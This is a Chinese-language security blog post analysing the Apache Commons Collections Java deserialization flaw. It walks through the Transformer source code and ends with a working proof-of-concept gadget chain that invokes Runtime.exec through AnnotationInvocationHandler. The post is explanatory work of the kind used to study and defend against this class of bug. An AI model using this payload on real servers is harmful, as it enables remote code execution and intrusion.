---
layout:     post
title:      Commons Collections 反序列化
subtitle:   反序列化
date:       2018-09-26
author:     Sayihxd
header-img: img/post-bg-ios9-web.jpg
catalog: true
tags:
    - Java
    - 基本概念
---

## 0x00 什么是序列化和反序列化
### 0x01 定义
- 序列化：将内存中对象的状态信息（结构，数据等等），转化为字节序列（可以用于存储或者是传输）的过程。
- 反序列化：反序列化是序列化的反向过程，将字节流转化为内存中的对象。

### 0x02 用途
当一个对象需要进行各种传输，或者需要进行存储的时候，就可以使用序列化和反序列化。

## 1x00 触发原因
`Apache Commons Collections`扩展了Java中的集合序列，是Apache的重要组建。**当服务端需要进行反序列化动作的时候，会调用`ObjectInpuStream`其中的`raedObject(...)`方法**，并且在对集合序列中的数据进行操作（例如put操作）的时候会调用在创建的时候所传入的`Transformed`对象，并调用其中的`transformed`方法。

服务端在读取对象的时候大致的代码如下：
```
try {
    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(new File("poc.bin")));
    // 调用了readObject
    Object object = ois.readObject();
    System.out.println(object.getClass());
    TransformedMap map = (TransformedMap) object;
    ((TransformedMap) object).put("1","2");
} catch (Exception e) {
    e.printStackTrace();
}
```

作为攻击者，我们可以自己来序列化一个对象，并且可以控制`Transformed`对象的实现，所以达到了攻击的目的。

具体的调用链如下：
 ```
 // 这里以TransformedMap来作为例子
 TransformedMap.readObject() --> TransformedMap.put(...) ==>Transformed.transform(...)
 ```
 > 有些特殊的类，例如之前用来做攻击的`AnnotationInvocationHandler`中，会在`readObject`方法中调用所传入的Map,达到在`readObject()`中直接触发`transform`方法，并执行其中的恶意代码。
 
## 2x00 具体分析
先给出Transformer的调用代码例子：
```
public class MyTest {
    public static void main(String[] args) {
        // 获得一个调用链
        Transformer[] transformers = getChainedTransformer();
        // 封装成一个ChainedTransformer
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        // 创建存放数据的Map
        Map<String, String> innerMap = new HashMap();
        innerMap.put("1", "zhang");
        // 使用TransformedMap来包裹存放数据的Map
        Map outerMap = TransformedMap.decorate(innerMap, null, chainedTransformer);
        // 改变数据，出发Transformer
        Map.Entry entry = (Map.Entry) outerMap.entrySet().iterator().next();
        entry.setValue("foll"); // 触发transformer链
    }

    private static Transformer[] getChainedTransformer() {
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime",
                    new Class[0]}),
            new InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[]{}}),
            new InvokerTransformer("exec", // 方法名
                new Class[]{String.class}, // 参数类型
                new Object[]{"mkdir /tmp/test"}) // 参数值
        };
        return transformers;
    }
}
```

### 2x01 Commons Collections
在`Commons Collections`包中，在各个数据类型的包（例如map,set,list等）下会有一个类叫做`TransformedXXX`，例如：
> ![](https://note.youdao.com/yws/public/resource/496394bf8696a286a4c1b9dc0fdea4d3/xmlnote/0A3F4D25991B46C398B23AECB8E1A63B/2086)

这里以`TransformedMap`作为例子，分析其源代码:
> **构造方法：**

使用`TransformedMap`的时候，调用的是`decorate`，但是实际在内部调用的是`TransformedMap`的构造方法，所以看构造方法。
```Java
/**
 * Constructor that wraps (not copies).
 * <p>
 * If there are any elements already in the collection being decorated, they
 * are NOT transformed.
 * 
 * @param map  the map to decorate, must not be null
 * @param keyTransformer  the transformer to use for key conversion, null means no conversion
 * @param valueTransformer  the transformer to use for value conversion, null means no conversion
 * @throws IllegalArgumentException if map is null
 */
protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    super(map); // 最后会调用thismap = map 做一个存储
    this.keyTransformer = keyTransformer;
    this.valueTransformer = valueTransformer;
}
```
在构造方法中，将需要使用的对象进行了存放。

`TransformedMap`的特点就是在**数据发生了改变的时候，会使用传入的Transformer来进行数据转换**，在源码中，对Map的相关方法例如put进行了实现（其父类是一个abstract的类，并且实现了Map），看下源码：
> **put方法源码：**
```Java
public Object put(Object key, Object value) {
    key = transformKey(key);
    value = transformValue(value);
    return getMap().put(key, value);
}
```
继续跟踪到transformKey方法中：
```Java
/**
 * Transforms a key.
 * <p>
 * The transformer itself may throw an exception if necessary.
 * 
 * @param object  the object to transform
 * @throws the transformed object
 */
protected Object transformKey(Object object) {
    if (keyTransformer == null) {
        return object;
    }
    // 调用了transform方法进了转换
    return keyTransformer.transform(object);
}
```
可以从源码中看到，在数据发生了变化的时候，会调用传入的`Transformer`的`transform`方法来做数据转换。

### 2x02 Transform是啥
`Transformer`是用于做转换的类，这里我们常用的有:
```
ConstantTransformer
    |- 传入目标Class对象，返回这个Class。
InvokerTransformer
    |- 通过反射机制，调用对应的方法，并返回执行的结果
ChainedTransformer
    |- 链式调用，传入一个Transformer数组，会按照顺序进行调用，达到一个链式调用的目的
```
他们都实现了同一个接口`Transformer`，内容如下：
```Java
public interface Transformer {

    /**
     * Transforms the input object (leaving it unchanged) into some output object.
     *
     * @param input  the object to be transformed, should be left unchanged
     * @return a transformed object
     * @throws ClassCastException (runtime) if the input is the wrong class
     * @throws IllegalArgumentException (runtime) if the input is invalid
     * @throws FunctorException (runtime) if the transform cannot be completed
     */
    public Object transform(Object input);

}
```
可以看见只是规定了一个方法`transform`，这个方法是用来进行数据转换的。
这里看下`InvokerTransformer`的实现。

> **构造方法：**
```
/**
* Constructor that performs no validation.
* Use <code>getInstance</code> if you want that.
* 
* @param methodName  the method to call
* @param paramTypes  the constructor parameter types, not cloned
* @param args  the constructor arguments, not cloned
*/
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
    super();
    iMethodName = methodName;
    iParamTypes = paramTypes;
    iArgs = args;
}
```

在构造方法中，只是将一会通过反射并调用方法所需要的数据进行了保存，这里传入的内容是我们所想要调用的方法（例如：Runtime的exec方法）,注意这里是没有传入Class的，Class需要从外界传入。
再看下`InvokerTransformer`对于`transfomer`方法的实现：
> **transform方法的实现：**

```Java
/**
* Transforms the input to result by invoking a method on the input.
* 
* @param input  the input object to transform
* @return the transformed result, null if null input
*/
public Object transform(Object input) {
    if (input == null) { // 进行判空
        return null;
    }
    try {
        // 从外界获取到Class
        Class cls = input.getClass();
        // 通过构造方法中所传入的参数，调用构建的时候所想要调用的函数
        Method method = cls.getMethod(iMethodName, iParamTypes);
        return method.invoke(input, iArgs);
            
    } catch (NoSuchMethodException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
    } catch (IllegalAccessException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
    } catch (InvocationTargetException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
    }
}
```
这里可以看见Class是从外部传递过来的，那么这里要怎么来传递这个Class，回想`2x00`位置给出的代码，可以看见`InvokerTransformer`的调用后面是交给了`ChainedTransformer`来进行调用的，所以这里去看`ChainedTransformer`的代码:
>**构造方法：**
```Java
/**
 * Constructor that performs no validation.
 * Use <code>getInstance</code> if you want that.
 * 
 * @param transformers  the transformers to chain, not copied, no nulls
 */
public ChainedTransformer(Transformer[] transformers) {
    super();
    /** 这里iTransformers的声明如下：
    *   The transformers to call in turn
    *   private final Transformer[] iTransformers;
    */
    iTransformers = transformers;
}
```
在构造方法中，只是将传入的Transformer数组进行了保存，方便后面的使用。接下来看下在`transform`方法中的具体使用。

>**transform方法：**
```Java
/**
 * Transforms the input to result via each decorated transformer
 * 
 * @param object  the input object passed to the first transformer
 * @return the transformed result
 */
public Object transform(Object object) {
    // 通过循环挨个调用传入的Transformer
    for (int i = 0; i < iTransformers.length; i++) {
        // 这里将上一个Transformer的结果传给了下一个
        object = iTransformers[i].transform(object);
    }
    return object;
}
```
这里就能解释`InvokerTransformer`的Class是从哪里来的了，因为在数组中前一个是`ConstantTransformer`他的结果是一个Class。

到这里基本上`Transformer`已经分析得差不多了，总结下：

**Transformer用于给commons中的集合架构做数据转换，各种Transformer结合起来可以做成一个转换链。**

### 2x03 原理小结
在Collections的各个类中，当发生了数据改变的时候，就会调用Transformer对象的transform方法，然后例如InvokerTransformer我们是可以控制，**指定的类**的**指定的方法**的**指定的参数**。并且整个过程并没有任何的恶意代码校验，这样，我们就可以构造恶意攻击链达到攻击的目的。

## 3x00 实例
### 3x01 进一步的设计攻击链
现在的问题是：**必须要调用集合架构中的key、value的改变的方法才会调用Transformer的transform方法**。这样攻击是很被动的，所以这里如果能找到一个**能够在序列化的时候，也就是调用readObject的时候就对key/value进行操作的类**，这样我们的攻击会更直接。
> 因为apach.commons.Collections已经在出问题之后做了相关的校验，所以这里找的是网上的老版本的代码截图。

经过网上一群大佬的研究，找到了这样的一个类`AnnotationInvocationHandler`，这个类就是符合刚才所说的那个要求。其`readObject`方法截图如图。

![](https://note.youdao.com/yws/public/resource/496394bf8696a286a4c1b9dc0fdea4d3/xmlnote/48E3BCC981424FB7B42A5B9496456681/2221)
可以看见在其中对`memberValue`做了操作，所以这里会直接出发Transformer的transform方法。

根据这个写出Poc:

```Java
public class MyPoc {
    public static void main(String[] args) {
        String execArgs = "whoami";
        ChainedTransformer chainedTransformer = getChainedTransformer(execArgs);
        // 创建一个内部Map，存放数据的那个
        HashMap<String, String> innerMap = new HashMap<String, String>();
        innerMap.put("fool", "fool");
        Map outterMap = TransformedMap.decorate(innerMap, chainedTransformer, chainedTransformer);

        try {
            Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
            constructor.setAccessible(true);
            Object instance = constructor.newInstance(Target.class, outterMap);
            File file = new File("poc.bin");
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(file));
            oos.writeObject(instance);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // 获取调用链
    private static ChainedTransformer getChainedTransformer(String execArgs) {
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime",
                    new Class[0]}),
            new InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[]{}}),
            new InvokerTransformer("exec", // 方法名
                new Class[]{String.class}, // 参数类型
                new Object[]{execArgs}) // 参数值
        };
        return new ChainedTransformer(transformers);
    }
}
```

